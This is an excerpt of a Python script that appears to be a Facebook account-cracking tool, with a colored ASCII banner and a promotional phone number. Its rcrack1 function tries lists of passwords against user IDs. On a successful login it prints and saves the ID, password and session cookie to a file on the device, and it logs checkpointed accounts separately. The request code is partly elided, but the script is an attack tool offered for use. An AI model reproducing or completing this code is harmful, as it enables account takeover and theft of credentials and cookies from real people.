...
#--------------------------(LOGO BOX)--------------------------#
logo =("""                                                
\x1b[38;5;46m.d8888. d88888b db    db 
88'  YP 88'     `8b  d8' 
`8bo.   88ooooo  `8bd8'  
  `Y8b. 88~~~~~  .dPYb.  
db   8D 88.     .8P  Y8. 
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mANIS Schiaparelli
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print('[+] BD NUMBER  => 016 213 018 212')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sOPPO\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[FG-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/FG-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
...
#              print(f"\x1b[38;5;196m[ARAFAT-CP💔] {uid}|{ps}")
                open('/sdcard/FG-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
